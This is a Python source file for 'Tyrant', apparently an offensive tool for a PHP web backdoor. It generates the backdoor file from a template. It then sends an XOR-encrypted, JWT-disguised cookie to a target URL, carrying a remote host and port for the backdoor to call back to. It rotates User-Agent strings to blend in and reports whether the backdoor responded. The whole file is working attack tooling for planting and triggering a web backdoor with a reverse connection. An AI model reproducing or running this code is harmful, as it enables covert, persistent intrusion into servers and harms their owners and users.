# Maptnh@S-HCK13
import base64
import requests
import re
import argparse
import sys
import os
import time
import random

class Tyrant:
    logo = '''
    ████████╗██╗░░░██╗██████╗░░█████╗░███╗░░██╗████████╗░░░░░░██████╗░███████╗██████╗░░██████╗██╗░██████╗████████╗███████╗███╗░░██╗
    ╚══██╔══╝╚██╗░██╔╝██╔══██╗██╔══██╗████╗░██║╚══██╔══╝░░░░░░██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗░██║
    ░░░██║░░░░╚████╔╝░██████╔╝███████║██╔██╗██║░░░██║░░░█████╗██████╔╝█████╗░░██████╔╝╚█████╗░██║╚█████╗░░░░██║░░░█████╗░░██╔██╗██║
    ░░░██║░░░░░╚██╔╝░░██╔══██╗██╔══██║██║╚████║░░░██║░░░╚════╝██╔═══╝░██╔══╝░░██╔══██╗░╚═══██╗██║░╚═══██╗░░░██║░░░██╔══╝░░██║╚████║
    ░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░╚███║░░░██║░░░░░░░░░██║░░░░░███████╗██║░░██║██████╔╝██║██████╔╝░░░██║░░░███████╗██║░╚███║
    ░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚══╝
        Maptnh@S-H4CK13                          Version 1.1.0                       https://github.com/MartinxMax/Tyrant
    '''
    
    def __init__(self, args):
        self.args = args
    
    def reverse_string(self,s):
        return s[::-1]

    def get_timestamp(self):
        return str(int(time.time()))
    
    def xor_decrypt(self, data: bytes, key: bytes):
        decrypted = bytearray()
        key_length = len(key)
        for i in range(len(data)):
            decrypted.append(data[i] ^ key[i % key_length])
        return bytes(decrypted)

    def xor_encrypt(self, data: bytes, key: bytes):
        encrypted = bytearray()
        key_length = len(key)
        for i in range(len(data)):
            encrypted.append(data[i] ^ key[i % key_length])
        return bytes(encrypted)

    def generate_payload_file(self, id: str):
        try:
            with open('./php/rev', 'r') as rev_file:
                content = rev_file.read()
                content = content.replace('@MID', id)

            os.makedirs('./opt', exist_ok=True)

            with open('./opt/tyrant.php', 'w') as output_file:
                output_file.write(content)

            print(f"[+] Payload file generated at ./opt/tyrant.php")
        except FileNotFoundError:
            print("[!] Error: ./php/rev file not found.")
        except Exception as e:
            print(f"[!] An error occurred while generating the payload: {e}")
    def base64url_encode(self, data):
            return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
    def get_random_user_agent(self):

        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
        ]
        
        return random.choice(user_agents)
    
    def send_payload(self):
        data = f'{{"id":"{self.args.id}","uid":"{self.args.uid}","rhost":"{self.args.rhost}","rport":"{self.args.rport}"}}'
 
        print(f"[*] Acquiring Target: {self.args.url}")
        data_bytes = data.encode('utf-8')
        mid_bytes = self.args.id.encode('utf-8')
        header='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'
        # PAYLAOD 1
        p1_e = self.xor_encrypt(data_bytes, mid_bytes)
        payload_1 = self.base64url_encode(p1_e)
        # PAYLAOD 2
        p2 = self.reverse_string(self.args.id).encode('utf-8')
        p2_e = encs = self.xor_encrypt(self.get_timestamp().encode('utf-8'), p2)
        payload_2 = self.base64url_encode(p2_e)
        payload = {'tyrant': header+'.'+payload_1+'.'+payload_2}
 
        
        response = requests.post(self.args.url,
                                cookies=payload,
                                headers={'User-Agent': self.get_random_user_agent()})
        
        


        if response.status_code == 200:
            match = re.search(r"document\.getElementById\('bk'\)\.value\s*=\s*'(\d+)';", response.text)
            if match:
                status_code = int(match.group(1))
                if status_code == 4130:
                    print("[!] Incorrect Machine ID")
                elif status_code == 4131:
                    print("[!] Tyrant can't seem to execute executables")
                elif status_code == 4132:
                    print("[+] Got Tyrant.....")
                else:
                    print("[Oops!] Tyrant got an unknown error")
            else:
                print("[Oops!] Tyrant The page has been found, but the backdoor may be damaged and unavailable")
        else:
            print("[Oops!] Tyrant can't be accessed or located. The backdoor file may have been deleted")

    def run(self):
        if self.args.gen and self.args.id:
            self.generate_payload_file(self.args.id)
            return
        
        if not all([self.args.id, self.args.uid, self.args.rhost, self.args.rport, self.args.url]):
            print("[!] Error: Missing required parameters.")
            sys.exit(1)

        self.send_payload()

def main():
    print(Tyrant.logo)
    parser = argparse.ArgumentParser(description="Encrypt payload and send POST request.")
    parser.add_argument("-id", required=True, help="Device ID")
    parser.add_argument("-uid", help="User ID")
    parser.add_argument("-rhost", help="Remote host")
    parser.add_argument("-rport", help="Remote port")
    parser.add_argument("-url", help="Target URL")
    parser.add_argument("-gen", action='store_true', help="Generate the payload file")

    args = parser.parse_args()

    tyrant = Tyrant(args)
    tyrant.run()

if __name__ == "__main__":
    main()
